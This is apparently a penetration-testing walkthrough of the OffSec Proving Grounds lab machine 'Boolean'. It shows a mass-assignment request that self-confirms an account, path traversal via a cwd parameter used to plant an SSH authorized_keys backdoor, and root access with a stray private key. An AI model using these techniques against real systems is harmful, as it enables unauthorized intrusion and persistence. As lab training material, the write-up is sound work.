---
title: "PG: Boolean"
date: 2024-04-05
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/boolean/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - mass-assignment
  - path-traversal
  - file-upload
  - ssh-key
categories:
  - walkthrough
---

{{< box-info name="Boolean" os="Linux" difficulty="Medium" ip="192.168.159.231" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http    (Boolean web app)
33017/tcp open  http    Apache httpd 2.4.38 ((Debian))
```
{{< /collapse >}}

SSH is a dead end without creds. Two HTTP surfaces: the main **Boolean** app on port 80 and a separate Apache "Development" vhost on port 33017.

### Port 80 - Boolean web app

Directory fuzzing turns up an open registration flow:

```
/login       200
/register     200
/robots.txt   200
```

Self-service registration is the interesting bit — it hands us an authenticated session to poke at.

### Port 33017 - Development

Apache 2.4.38 serving a "Development" site. Fuzzing only exposes `/admin` (403), `/cgi-bin` (403), and `/info` — nothing exploitable. Dead end; the way in is port 80.

---

## Foothold

### Mass assignment — confirming our own account

Register an account. The app parks the new email in an "awaiting approval" state but lets us edit it. Intercepting that update request shows the object round-tripping as nested params — `user[email]=evil@evil.io` — and the response reflects a `confirmed` attribute sitting at `false`.

If the confirmation state is just another field on the same object, we can set it ourselves. Add it to the request:

```
user[email]=evil@evil.io&user[confirmed]=true
```

The account comes back confirmed. Classic mass assignment — the app never expected us to control `confirmed`.

### Path traversal → file upload → SSH backdoor

A confirmed account unlocks a file upload feature with no real restrictions. Uploaded files are served back through a download endpoint:

```
http://192.168.159.231/?cwd=&file=pac&download=true
```

That `cwd` parameter is a current-working-directory handle. A full `../../../../etc/passwd` payload does nothing, but a single `../` walks up exactly one directory — so `cwd` is an incremental traversal primitive. Step through it and we can reach arbitrary directories to **download** files we can read *and* **upload** into directories we can write. Enumerating around:

- the landing directory belongs to **`remi`** → that's our user
- `remi`'s home contains a `.ssh/` directory
- SSH (22) is open

That combination is an SSH backdoor waiting to happen. Generate a keypair, then abuse the upload-into-`cwd` write primitive to drop our public key as `authorized_keys` inside `/home/remi/.ssh/`:

```bash
ssh-keygen -q -N '' -f ./id_ed25519
# rename ./id_ed25519.pub -> authorized_keys, then upload it into remi's .ssh/ via cwd traversal
ssh remi@192.168.159.231 -i ./id_ed25519
```

Shell as `remi`.

---

## Privilege Escalation

### Root's SSH key left on disk

LinPEAS flags a non-standard directory in `remi`'s home:

```
remi@boolean:~$ ll /home/remi/.ssh/keys/
total 24K
drwx------ 2 remi remi 4.0K Oct 25  2022 ./
drwx------ 3 remi remi 4.0K Apr  5 13:01 ../
-rw------- 1 remi remi 1.8K Oct 25  2022 id_rsa
-rw------- 1 remi remi 1.8K Oct 25  2022 id_rsa.1
-rw------- 1 remi remi 1.8K Oct 25  2022 id_rsa.2
-rw------- 1 remi remi 1.8K Oct 25  2022 root
```

A private key file literally named `root`, readable by `remi`. Copying it off-box and connecting from the attack machine fails (SSH is locked down), but using it *from `remi`'s own shell* against localhost sails through:

```bash
remi@boolean:~$ ssh -i /home/remi/.ssh/keys/root root@127.0.0.1
```

Root.

---

## Proof

{{< terminal title="root@boolean" >}}
remi@boolean:~$ ssh -i /home/remi/.ssh/keys/root root@127.0.0.1
root@boolean:~#
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- **Mass assignment:** when an object's attributes round-trip through a form (`user[confirmed]=false`), try setting the fields the app never meant you to control.
- A `cwd`/`dir`/`path` parameter that shifts on a single `../` is a traversal primitive — pair read + write with an open SSH port and it becomes an `authorized_keys` backdoor.
- Always sweep the filesystem for stray private keys. A file named `root` in a readable `.ssh/keys/` is instant game over.
- Keys pulled off-box can fail against SSH hardening (`from=`/host restrictions); pivoting to `127.0.0.1` from the shell you already have sidesteps it.
{{< /callout >}}
